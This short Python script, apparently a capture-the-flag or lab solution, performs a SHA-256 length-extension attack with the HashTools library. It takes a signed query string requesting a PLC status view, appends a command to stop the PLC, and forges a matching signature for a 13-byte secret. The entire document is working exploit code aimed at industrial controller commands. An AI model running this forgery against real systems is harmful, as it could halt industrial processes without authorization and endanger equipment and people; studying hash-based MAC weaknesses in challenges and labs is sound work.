import HashTools

original_data = b"?action=VIEW_PLC_STATUS"
sig = '<hex_sig_here>'
append_data = b"&action=STOP_PLC"
magic = HashTools.new("sha256")
new_data, new_sig = magic.extension(
  secret_length=13, original_data=original_data,
  append_data=append_data, signature=sig
)
